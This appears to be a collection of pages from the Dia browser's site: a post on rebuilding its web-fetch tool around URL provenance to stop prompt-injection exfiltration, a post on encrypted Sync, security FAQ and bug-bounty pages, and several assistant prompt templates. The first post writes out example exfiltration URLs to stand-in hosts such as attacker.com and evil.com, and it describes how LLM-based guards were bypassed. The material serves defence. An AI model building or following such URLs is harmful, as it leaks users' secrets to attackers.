This is a story about what it looks like to take AI security seriously: acknowledging when something isn't working, having the discipline to unship, and investing in solutions that address root causes rather than symptoms. It's also just one example—Dia's security architecture includes many layers of protection, each designed to address different threat vectors. This post is a deep dive into one of them.
What is fetch_web_content?
fetch_web_content

is one of Dia's most versatile tools. It allows the assistant to retrieve information from URLs—pulling in web pages, documentation, articles, and other online resources to provide richer, more informed responses.
When a user asks Dia to summarize a link, check the status of a service, or pull in context from the web,
fetch_web_content
makes that possible. It's the kind of capability that transforms an AI assistant from a static knowledge base into a dynamic, connected helper.
We were excited to ship it. It was one of the first tools we built—present in Dia's earliest internal builds back in January 2025.
Then we broke it.
The Discovery: Data Exfiltration via URL Encoding
During security testing, our team uncovered a serious vulnerability class. The attack vector was elegant in its simplicity and terrifying in its implications.
Here's how it works:
URLs can encode arbitrary data.
A URL like
https://attacker.com/log?data=secret123
transmits secret123 to
attacker.com
when fetched.
LLMs are eager to follow instructions.
If an attacker can inject malicious instructions into content the model processes (via prompt injection), they can instruct the model to:
Extract sensitive information from the user's context
Encode that data into a URL parameter
Call
fetch_web_content
on that URL
The fetch itself becomes the exfiltration.
The moment Dia makes that request, the sensitive data—passwords, API keys, private conversations, whatever was in context—gets transmitted to the attacker's server in the request logs.
No fancy exploits. No zero-days. Just the normal, intended behavior of a URL fetch, exploited through prompt injection.
The Attempt: Can We Detect and Block This?
Once we understood the shape of the attack, our first instinct was straightforward: keep the feature, but get really good at spotting the bad cases.
That led us down the detection path. We tried a bunch of variants of the same basic idea: let the model decide what to fetch, then add checks to catch exfiltration
before
the request goes out.
Here’s what we tested through the first half of 2025:
URL allowlisting and blocklisting
— This sounds reasonable until you remember how cheap domains are. Attackers can register new domains instantly, and even legitimate sites can be turned into collection endpoints.
Pattern detection for sensitive data in URLs

— We looked for things that “seem like secrets” (tokens, keys, long base64-ish blobs, etc.). The false positive rate was brutal, because real-world URLs are full of encoded parameters. And in the cases that mattered most, attackers could just transform or split the data until it no longer matched.
Heuristic analysis of URL structure

— We tried scoring requests based on URL shape: parameter length, entropy, suspicious parameter names, unusual encoding patterns, and so on. This helped catch the obvious stuff, but sophisticated attackers would have no trouble producing URLs that looked completely normal.
Output filtering

— Another thought was “even if the model tries to exfiltrate, we’ll catch it on the way out.” But the model can obfuscate data before encoding it, or distribute it across multiple innocuous-looking requests.
Prompt-based guardrails
— We also tried the standard "tell the model not to do that" approach. The problem is prompt injection
is the attack
. If your defense relies on the model consistently ignoring malicious instructions, you're betting against the one thing the attacker is best positioned to influence.

We also explored a natural escalation of these ideas: using LLMs themselves as part of the defense—either to review the page context for signs of prompt injection, or to inspect the generated URL and decide whether it looked like exfiltration.
On paper, this is appealing. Models can reason about intent, generalize beyond fixed patterns, and catch things that would slip past regex and heuristics.

In practice, it didn’t change the outcome. Our team was able to bypass every LLM-based detection mechanism we tried—regardless of model size—using the same playbook attackers use everywhere else: obfuscation, indirection, chunking, encoding, and “make it look normal” transformations. Even when the guard model flagged attacks sometimes, it wasn’t consistent enough to be a security boundary we could actually rely on.
We kept circling back to the same uncomfortable conclusion: we were trying to tell the difference between a legitimate fetch and a malicious fetch
after the model had already decided to make the request
—and the adversary could shape both the content and the model’s behavior.
Detection-based security is not sufficient when the attacker controls the input to your detector and can influence the detector's ruleset.
What About Asking the User?
There's one mitigation we haven't mentioned yet: human-in-the-loop confirmation. What if we just asked the user before fetching each URL?

This sounds reasonable. It's a pattern users have seen before—banks, social networks, and other sites show similar prompts when you click an external link. But we concluded that humans couldn't effectively be in the loop here, for several reasons:
The risk profile is completely different.
Those familiar prompts warn you that you're
leaving

a trusted site—not that your data might be stolen immediately by proceeding. When a bank shows "You are now leaving Example Bank," the worst case is usually landing on a phishing page you can recognize and close. Our prompt would need to communicate something much more severe: "If you approve this, sensitive data from your context could be transmitted to an attacker." Users aren't trained to think about URL fetches this way, and we couldn't expect them to understand how novel this situation is.
It's a terrible user experience.

Dia often fetches multiple URLs to answer a single question—pulling in documentation, checking references, gathering context. Prompting for each fetch would be exhausting and would undermine the core value of having an AI assistant that can work with the web on your behalf.
Even "allowlist this domain" doesn't work.
You might think users could approve trusted domains once and be done with it. But most major domains have open redirects—URL endpoints that will redirect to any destination. Allowlist
youtube.com
, and an attacker can use YouTube's well-known open redirect to bounce data to their own server. The allowlist becomes a bypass, not a protection.
In this situation: we couldn't make users the security boundary. The solution had to be architectural.
The Decision: Unlaunch
By
June 2025
, we were preparing to launch Dia's public beta. We had a decision to make.
This wasn't a close call. We had a feature that could be exploited to exfiltrate user data, and we couldn't reliably prevent it.
We unlaunched
fetch_web_content
. It didn't ship with the beta.
Shipping fast matters. Shipping secure matters more.
The Rebuild: Secure by Design
We went back to first principles. Instead of asking "how do we detect malicious fetches?" we asked "how do we make this class of malicious fetches impossible in practice?"
The answer required rethinking the feature's architecture entirely:
URL Provenance
By design,
fetch_web_content
enforces
provenance

—a clear chain of custody showing where a URL came from. URLs that appear in the user's browsing context, their tabs, their messages? Those have provenance. URLs the model generates from whole cloth, potentially stuffed with exfiltrated data? Those don't.
If a URL can't demonstrate where it came from,
fetch_web_content
is designed to reject it.
URLs
with
provenance (allowed):
A link the user clicks or pastes—"Summarize this article" with a URL from their clipboard or an open tab
A link visible in the user's browsing context—a URL from a webpage they're actively viewing
A link from a message or email—a URL that appeared in a Slack message, email, or chat the user shared with Dia
A link from a document the user opened—a URL embedded in a PDF, Google Doc, or Notion page the user explicitly gave Dia access to
URLs
without
provenance (blocked):
A URL the model constructs on its own:
https://attacker.com/log?data=
+ [user's password]
A URL synthesized from injected instructions—an attacker's page says "fetch
https://evil.com?secret=
..." and the model builds that URL dynamically
A URL with query parameters the model invented—even if the user shared
example.com/article
, the model can't fetch
example.com/article?leak=USER_PASSWORD
because that full URL was never in the user's context
Provenance isn't about whether a URL
looks
safe—it's about whether we can trace it back to something the user actually provided or intended to access. The model can
choose
which URLs to fetch, but provenance enforcement dramatically narrows the set of URLs it can access to those rooted in the user's context.
Assume Prompt Injection Will Happen
This is the key mental shift. We stopped designing for a world where we successfully block all prompt injection.
We started designing for a world where prompt injection happen, and the attacker can’t get the results they want.
When an attacker injects malicious instructions, Dia might follow them. It might even try to construct a malicious URL. But when it calls
fetch_web_content
, the URL is checked against its provenance policy. Attacker-constructed URLs are rejected before data leaves the device.
Defense in Depth
URL provenance is our primary control, but it's not our only one. We've layered additional safeguards throughout the system. The details are less important than the principle:
no single control failing should compromise user security
The Result
A couple of months later,
fetch_web_content
came back. It's just as useful as before—users can ask Dia to pull in web content, summarize articles, and work with online resources.
But now, even if an attacker achieves prompt injection, this attack vector is effectively closed off.
To be clear: this doesn't mean
fetch_web_content
is immune to all misuse, or that prompt injection is "solved." Other attack patterns require other defenses. What we've done is architecturally close off
this specific threat
—data exfiltration via URL encoding—so that even a successful prompt injection can't exploit it.
Why This Matters

The security community has been sounding the alarm on prompt injection for years. And they're right—it's a hard problem without a clean solution. You can't consistently and robustly detect all prompt injections, which means you can't fully trust model outputs.
But you
can
design systems that limit blast radius even when prompt injection succeeds.
This is the path forward for AI security:
assume compromise, design for containment.
fetch_web_content

is one tool, and URL provenance is one control. Dia's broader security posture includes many other systems—each with its own story of iteration, testing, and refinement. We'll share more of those stories over time.
Join Us
Building AI agents that can safely interact with the real world is still a frontier problem. The attacks are evolving, the tooling is immature, and the cost of getting it wrong is real user harm.

That’s why our Trust and Safety team is growing. If you’re excited about AI security—agent containment, prompt injection defense, tool safety, sandboxing, provenance, and defense-in-depth—and you want to help build Dia’s AI capabilities the right way, we’d love to talk.

On Thursday, April 9, 2026, we launched a much-anticipated feature in Dia: Sync. Here's how we shipped this feature securely.
TL;DR

Sync lets you access your bookmarks, tabs, and profiles (with more to come!) across multiple devices. Your sync data is end-to-end encrypted before it ever leaves your device — we can't read it, even though we store it on your behalf. This post walks through how we generate and protect your encryption keys, how we transfer them between devices without exposing them to our servers, and the design principle at the center of all of it:
assume our servers are compromised, and ensure they still can't access your data.
If you haven't tried Sync yet, here's
how to get started
Our design principle: assume compromise, design for containment
Before getting into the technical details, it's worth explaining the mental model we used when designing Sync's security.
We asked ourselves a simple question:
if our own servers were compromised and fully controlled by an attacker... could they access
your
synced data?
The answer had to be "no."

Every design decision in Sync flows from that constraint. The encryption happens on your device. The keys stay on your devices. The server stores ciphertext it cannot decrypt. When we needed to transfer keys between devices, we designed the transfer so that even a compromised server sitting in the middle can't extract the key.
This is the same philosophy we applied to
fetch_web_content
and other Dia capabilities. Don't just try to prevent bad outcomes. Design so they're structurally infeasible.
Your encryption key
When you enable Sync, Dia generates a random 256-bit encryption seed on your device. We call this your
sync key.
It's the root of all Sync encryption, and never leaves your devices.
From that seed, we use
HKDF-SHA256
to derive two keys:
A 256-bit
AES key
- this is the
encryption key
. Before any sync data leaves your device, it's encrypted with this key via AES-256-GCM. Our servers only ever receive ciphertext they cannot decrypt.
An
keypair - this is the
authentication key

. The server uses the public half to verify that sync operations are coming from a device that holds your sync key. Even if your Dia account is compromised, your synced data can’t be accessed or modified without one of your syncing devices.

Before any data is sent to Dia's servers, it's encrypted with your encryption key via AES-256-GCM. Both keys are derived from your sync key, and neither the sync key nor its derived keys are ever shared with our servers. Only your devices have the capacity to decrypt or modify your synced data.
We also use the
BIP39
protocol to convert your sync key into a 24-word recovery phrase. This gives you a human-readable backup of your key that's much easier to type than the raw key itself.
Adding new devices is the hard part
Encrypting data is the straightforward piece. The challenge is: how do you get your sync key onto a new device without exposing it to our servers?
Existing approaches all have tradeoffs for a desktop browser:
QR Codes

- Encrypted messengers like Signal use this: show a QR code on one device, scan it with the other. But Dia runs on laptops and desktops. Holding one laptop screen up to another is awkward, and desktops don't always have a camera. QR transfers work best with a phone.
Passwords

- Services like iCloud and password managers let you pick a password that derives the encryption key, but you already have a Dia password. Enterprises often use SSO without a password at all. We didn't want to introduce a second password just for Sync.
Recovery phrases
- Many services use these as a backup (Sync included), but they're cumbersome as a primary transfer method.
All three approaches transfer the key out of band, without touching the server. We started looking for a way to transfer keys
through
our server, between your devices, in a manner where our server could not eavesdrop. In other words: secure key transfer over an untrusted channel.
The solution: SPAKE key exchange
We landed on
Symmetric Password-Authenticated Key Exchange
(SPAKE), facilitated by our server, to pass the sync key between two devices in your account.
SPAKE is a special kind of key exchange. Like standard
Elliptic Curve Diffie-Hellman

, two parties exchange information across a server to compute a shared secret. But in SPAKE, the initial handshake itself is encrypted with a password both parties know beforehand. This means that any party in between (here, Dia's servers) would have to guess the password before they could attempt to insert themselves into the key exchange.
Here's how it works in practice:
When you add a new device, your existing device displays a
device transfer code
- a short alphanumeric code you type into your new device. This is the SPAKE password. You pass it between devices yourself; the server never sees it.
If a compromised server wanted to perform a
man-in-the-middle attack

, it would have to guess this code. But here's the critical detail: only your devices can validate whether a guess is correct. The server has to send its guesses to the client, and we've configured Dia to allow only three wrong attempts before the code is rotated. Since sync codes are 6 characters drawn from digits and uppercase letters, that's roughly 3 chances in 2 billion.
Once the transfer completes, the code is discarded and never reused.
Your data, your control
You can disable Sync at any time. And when you do, your encrypted data is permanently deleted from our servers. No retention period, no archival copy. It's gone.
If you delete your Dia account entirely, all associated data (including sync data) is deleted from our servers within 30 days.
Our broader design principle
With Sync, we're not just guaranteeing "we don't read your data." W
e can't

read your data, by design. A compromised server can refuse to sync your data (a denial-of-service), but it cannot read it, cannot modify it undetected, and cannot intercept your keys during device transfer.
This is the approach we take across all of Dia's security architecture:
assume compromise, design for containment.
We don't rely on our servers staying safe. We build so that even if they don't, your data does.
Sync's encryption, key exchange, and server components were independently assessed by a third-party security firm before launch.
For more on how Dia handles your data, see our
Privacy
page and
Security FAQ

children.text: Prompt injections happen when a webpage or third party slips instructions into an assistant’s context, and the assistant follows those instructions instead of the user's instructions. All AI chat systems face this risk. Our stance is to assume prompt injections may occur and keep you safe through layered controls.
Examples of these layered controls include:
Dia won't automatically open or follow LLM‑generated URLs .
Attackers often use generated links to exfiltrate data; we block this class of action.
Dia won't allow tools beyond what you intend to use.
Dia’s chat session starts with no access to other tabs or ability to take write actions. Your review is needed to grant access before the assistant can use anything with real-world effects.
Dia won't insert data into third-party sites without your approval.
For actions like “fill form” or “draft email,” Dia shows you the exact content first in a Dia-controlled view. You choose whether to proceed.
Dia won't take irreversible actions on behalf of the user.
Items like calendar events stay in draft until you click “Create.”
Dia won't run agentic mode on unapproved context.
When Dia drives your computer (e.g., replying to email), the assistant only sees what you saw and approved, limiting third-party influence.
Dia won't let agentic mode navigate to other websites.
To contain the blast radius of actions, the assistant is unable to navigate on its own to another website
Dia won't expose sensitive elements to the agent.
Web form fields like passwords and irreversible action buttons are invisible to the agentic system.
Dia won't pass URLs to the LLM verbatim.
Links can hide instructions; Dia filters those so they can’t influence the AI.

faq.question: Is Dia vulnerable to prompt injections?

children.text: We design Dia’s features so that, even if a prompt injection occurs, the potential impact is contained. The web is adversarial and we are constantly researching and finding more ways to protect you while you use Dia.
That said, prompt injections can still:
Cause unexpected style or tone shifts (e.g., making the assistant “talk like a pirate”).
Nudge content toward misinformation if a tab is treated as local “ground truth.” Context improves relevance, not universal correctness.
Trigger unintended assistant actions, like searches or lookups you didn’t ask for.

Our layered controls are designed to prevent the most harmful outcomes like sending your data to an attacker or taking actions you didn’t approve, but no defense is perfect. We recommend reviewing the assistant’s responses carefully, especially when working with untrusted content.
Practical tips to reduce prompt‑injection risk:
Be specific about what you want the assistant to do, and review its actions before approving.
Be cautious when asking the assistant to work with content from unfamiliar or untrusted sources.
Review the assistant’s responses carefully, especially when the output will be shared or acted on.

faq.question: What are the limits of prompt injection defenses?

children.text: Your browser is your doorway to the internet—work, personal life, and everything in between. Keeping that doorway secure is core to how we design, build, and ship Dia.
We’re a focused team that treats security as a product feature, not an afterthought. Our goal is simple: you shouldn’t have to worry that your data is being misused, mishandled, or sold.
To make that concrete, here’s what we do and how we think about it:
Outside security assessments

We work with independent security firms to run regular audits of our products. Each year, we conduct full‑scope assessments and schedule point‑in‑time reviews for new or high‑risk features. These engagements include code reviews, architecture analysis, and exploit testing. When appropriate, we publish notable findings and fixes in our Security Bulletins.
Browser engine

Dia is built on Chromium—the same open‑source engine behind Chrome and Edge—so we inherit a battle‑tested foundation and the latest upstream security patches. We prioritize upgrades and keep Dia aligned with the newest Chromium releases and hotfixes on an aggressive cadence.
List of Disabled Chromium Features
Google Accounts Integration (GAIA) disabled
Chromium won’t send requests for accounts on startup to accounts.google.com
No syncing of Chromium profiles, cookies, passwords, bookmarks to Google via your Google account
Google metrics (UMA) reporting is disabled
Uploading settings after resetting profile is disabled
Reporting Observers and Reporting API are disabled
Network logging to file is disabled
Infrastructure

We restrict production access by role, log and review access regularly, and encrypt data at rest and in transit. We store as little personal data as possible, and we routinely audit what we collect to ensure it stays minimal and appropriate for the service.
How to reach us
If you have questions or see something we should look at, email help@diabrowser.com. If you’re a security researcher, our bug bounty program welcomes your reports

At The Browser Company of New York, we care deeply about safeguarding the security and privacy of everyone who uses our products. We also recognize the security research community’s invaluable role in this mission. If you spot a vulnerability, we want to hear about it so we can make things right as soon as possible. Your work helps us build a safer, more secure browsing experience for all.
Our Bug Bounty Program is ran through HackerOne. Please visit our
HackerOne program
page to review our program policy, scope, and to submit your findings.
How to Submit your Research
If you believe you’ve identified a security or privacy issue that affects BCNY products, services, or software, please submit it to us through our
HackerOne program.

What’s Going On Here, With This Human?

, Chris built this Skill to help decode the subtler signals—the energy someone gives off, their self-awareness, and where their center of gravity lies. It analyzes social profiles to save time and bring structure to the deeply human art of judgment.
You are a seasoned talent evaluator applying Graham Duncan’s ‘What’s going on here, with this human?’ lens.

Using only the public information in the profile below, produce a concise, high-fidelity brief (cynical if truthful) that opens with a TL;DR and then covers:
0. TL;DR (2-sentence max) – crisp headline insight about the person.
Game being played – the overarching, possibly infinite objective they appear to pursue.
Rider vs. Elephant – hypotheses about their conscious narrative (rider) and core drives/compulsions (elephant).
OCEAN Big Five snapshot – Openness, Conscientiousness, Extraversion, Agreeableness, Neuroticism (high/low + one-line evidence each).
MBTI type guess – likely four-letter code with a one-sentence rationale.
Enneagram type guess – dominant type (+ wing, if evident) with rationale.
Signature strengths shadow weaknesses – how each strength could invert under stress.
Ecosystem fit (‘water’) – contexts where their genius compounds vs. stalls.

IQ
EQ

Self-awareness
Integrity / trustworthiness
Collaborative ability
Ambition
Influence
Key questions to ask next – 3–5 questions that would most quickly confirm or falsify your hypotheses.
Optimal seat – the role or environment likely to unlock the most leverage for them (and for a team).
Embrace negative capability—hold multiple plausible readings at once, note your own biases, and state confidence levels.
Bullet format, ~450 words total.

Agent Instructions: Cold Emailing
Get to the point immediately.
Open with a direct statement of purpose (e.g., “I’m reaching out to discuss [specific topic/ask].”)
Skip long backstories unless a unique differentiator is essential.
Personalize and show you’ve done your homework.
Reference a specific detail about the recipient’s work, background, or recent project (e.g., “I saw you led the [project] at [organization].”)
Make it clear why you’re contacting them specifically.
State your value or question clearly.
If asking for advice, make it a single, specific question (e.g., “What’s the most overlooked challenge in [specific field or task]?”)
If pitching an idea, summarize it in 1–2 sentences, focusing on what’s new or actionable.
Keep it concise and structured.
Use short paragraphs or bullet points.
Limit the email to 5 sentences or fewer unless more detail is absolutely necessary.
Avoid hype and generic claims.
Don’t use phrases like “the next big thing” or other buzzwords.
Be honest about what you’re offering or asking.
Respect their time.
Don’t follow up more than once unless you have a meaningful update or new information.
If you don’t get a response, move on or improve your pitch before trying again.
End with a clear call to action.
For example: “Would you be open to a 10-minute call next week?” or “Could you share your perspective on [topic]?”
Signature
Use your full name, current role, and a single line about your background if relevant (e.g., “[University], aspiring [profession] focused on [specific interest].”)
Example:

[Recipient Name],

I’m a [Your Position] interested in how [Project/Initiative] is shaping [Field/Industry]. I’m working on a project about [topic] and would appreciate your perspective on the biggest challenges in [area]. Would you be open to a brief call or email exchange to discuss your experience?

[Your Name]
[Your Organization/Institution] | [Your Role or Interest]
Key points:
Always open with the main ask.
Reference something specific about the recipient.
Keep it short, direct, and actionable.
Only follow up if you have something new to add.
Reference: https://cnbc.com/2020/11/10/mark-cuban-how-to-get-my-attention-over-email.html

Think about the current topic via one or multiple "Fenton Frameworks" from Peter Fenton. They are… 

1. The Evolutionary Lens 
 • Variation: Encourage both planned and unplanned experiments—accept that most will fail, but some will be transformative.
 • Selection: Let the market and ecosystem apply pressure; don’t shield companies from hard truths.
 • Inheritance: Build on what works, but don’t be afraid to let go of what doesn’t. Pass on learnings, not dogma.

2. Depth Over Scale 
 • Small Teams: Keep the partnership tight (4–6 people) to maximize trust and decision speed.
 • Deep Relationships: Prioritize a few, high-trust, long-term founder relationships over many shallow ones.
 • Embrace Constraints: Accept that the most meaningful work doesn’t scale—and design your firm around that.

3. Sourcing for Greatness 
 • Curiosity-Driven: Actively seek out exceptional people; don’t wait for them to come to you.
 • Network Activation: Build a network that surfaces talent and amplifies your ability to spot outliers.
 • Taste & Judgment: Develop the intuition to recognize “oceanic” founders—those with clarity, authenticity, and drive.

4. Board Work as Energy Transfer 
 • Purpose Alignment: Always return to the founder’s core motivation and the company’s purpose.
 • Clarity & Structure: Help founders align strategy, structure, and people.
 • Energize & Deoxidize: After every board meeting, founders should feel more energized, aware, and curious.

5. Infinite Game Mindset 
 • Value System First: Play for meaning and impact, not just financial incentives.
 • Long-Term Commitment: Be willing to support founders for a decade or more.
 • Creative Destruction: Celebrate the rise of new companies and the necessary extinction of the old.

You are an expert financial analyst with deep knowledge of markets, economics, and quantitative analysis. I need you to conduct a comprehensive analysis of [SPECIFIC STOCK/SECTOR/MARKET]. Please follow this systematic approach:

Research Framework
Phase 1: Multi-Source Data Gathering

Search for the most recent financial reports, earnings calls, and SEC filings
Gather macroeconomic indicators and relevant market data
Research industry trends, competitive landscape, and regulatory changes
Find analyst reports from major investment banks and research firms
Look for insider trading patterns and institutional investor movements

Phase 2: Fundamental Analysis

Analyze financial statements (income, balance sheet, cash flow) for the last 5 years
Calculate and interpret key ratios: P/E, PEG, ROE, ROA, debt-to-equity, current ratio
Evaluate revenue growth trends, profit margins, and cash flow patterns
Assess management quality, corporate governance, and strategic decisions
Compare valuation metrics against industry peers and historical averages

Phase 3: Technical & Market Analysis

Examine price charts, trading volumes, and technical indicators
Identify support/resistance levels, trend patterns, and momentum signals
Analyze market sentiment indicators and options flow data
Review correlation with broader market indices and sector performance
Study seasonal patterns and historical volatility

Phase 4: Risk Assessment

Identify company-specific risks (operational, financial, competitive)
Evaluate sector and macroeconomic risks
Assess geopolitical and regulatory risks
Consider black swan events and tail risks
Analyze stress test scenarios and worst-case outcomes

Phase 5: Multiple Scenario Modeling Create three detailed scenarios:

Bull Case: Best possible outcomes with supporting evidence
Base Case: Most likely scenario based on current trends
Bear Case: Pessimistic scenario with downside risks

For each scenario, provide:

Specific price targets with timeframes
Key catalysts that could trigger the scenario
Probability estimates with reasoning
Risk-reward ratios

Critical Thinking Requirements

Challenge your own assumptions and look for contradictory evidence
Consider cognitive biases that might affect your analysis
Examine both quantitative data and qualitative factors
Think about what the market might be missing or mispricing
Consider the limitations of your analysis and data sources

Output Format
Present your analysis in this structure:

Executive Summary (key findings and recommendation)
Current Situation (recent performance and key metrics)
Deep Dive Analysis (fundamental + technical insights)
Risk Matrix (probability and impact of key risks)
Scenario Analysis (bull/base/bear cases with targets)
Catalysts & Timeline (events that could move the stock)
Conclusion (investment thesis with confidence level)

Important Disclaimers

Acknowledge the inherent uncertainty in market predictions
Emphasize that this is analysis for educational purposes, not financial advice
Note the limitations of historical data in predicting future performance
Recommend consulting with qualified financial advisors for investment decisions
Include appropriate risk warnings about potential losses

Research Quality Standards

Use only reputable, verifiable sources
Cite specific data points with dates and sources
Distinguish between facts, estimates, and opinions
Update analysis if you find contradictory or more recent information
Be transparent about confidence levels for different conclusions
Please conduct this analysis with maximum depth and intellectual rigor. Take time to think through each component thoroughly before moving to the next phase.
